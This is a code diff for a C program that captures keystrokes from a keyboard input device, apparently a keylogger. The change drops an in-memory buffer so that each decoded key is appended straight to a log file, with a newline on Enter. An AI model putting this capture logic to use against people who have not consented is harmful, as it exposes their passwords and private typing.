@@ -23,19 +23,13 @@
 #define START_CAPTURE  "Start capturing..."
 #define RESETTING      "Resetting..."
 
-#ifndef KEYSTROKE_BUFFER_CLEANER
-#define KEYSTROKE_BUFFER_CLEANER(KEYSTROKE_BUFFER) {    \
-        free(KEYSTROKE_BUFFER);                         \
-}
-#endif
-
 struct kb_worker_cleanup_infos {
     struct kb_worker *kb_worker;
-    size_t keystroke_buffer_s;
-    char **keystroke_buffer;
     int    device_file_fd;
     int    reset;
 };
+
+static pthread_mutex_t lock;
 
 static void killed_worker(void *arg) {
     // Cleanup handler.
@@ -51,11 +45,6 @@ static void killed_worker(void *arg) {
         cleanup_infos->kb_worker->kb_status = KB_WORKER_FAILED;
         make_terminal_log(DISCONNECTED, cleanup_infos->kb_worker->kb_id);
     }
-    // Clean the keystroke buffer.
-    append_to_file((const char **) cleanup_infos->keystroke_buffer,
-                   cleanup_infos->keystroke_buffer_s, cleanup_infos->kb_worker->kb_id);
-
-    KEYSTROKE_BUFFER_CLEANER(cleanup_infos->keystroke_buffer);
 }
 
 _Noreturn void *start_worker(void *worker) {
@@ -64,8 +53,6 @@ _Noreturn void *start_worker(void *worker) {
     struct input_event device_event; // Current keyboard device event.
     struct kb_dec_key *decoded;
     size_t keystroke_buffer_s = 1;
-    char **keystroke_buffer;
-    ALLOC_MEM(keystroke_buffer, keystroke_buffer_s, sizeof(char **));
     char *device_event_path;
     ALLOC_MEM(device_event_path, strlen(worker_infos->kb_event_file), sizeof(char));
     pthread_cleanup_push(killed_worker, (void *) &cleanup_infos);
@@ -101,16 +88,11 @@ _Noreturn void *start_worker(void *worker) {
             decoded = decode(device_event.code);
             if (decoded == NULL) continue;
             make_keystroke_log(decoded->kb_key_name, worker_infos->kb_id);
-            keystroke_buffer[keystroke_buffer_s - 1] = decoded->kb_key_name;
-            REALLOC_MEM(keystroke_buffer, ++keystroke_buffer_s, sizeof(char **));
+            append_to_file(decoded->kb_key_name, worker_infos->kb_id);
+
             if (decoded->kb_key_code == KEY_ENTER) {
                 // Save the contents of the buffer.
-                append_to_file((const char **) keystroke_buffer, keystroke_buffer_s, worker_infos->kb_id);
-                // Clear the buffer.
-                KEYSTROKE_BUFFER_CLEANER(keystroke_buffer);
-                // Realloc the buffer.
-                ALLOC_MEM(keystroke_buffer, 1, sizeof(char **));
-                keystroke_buffer_s = 1;
+                append_to_file("\n", worker_infos->kb_id);
             }
         }
 
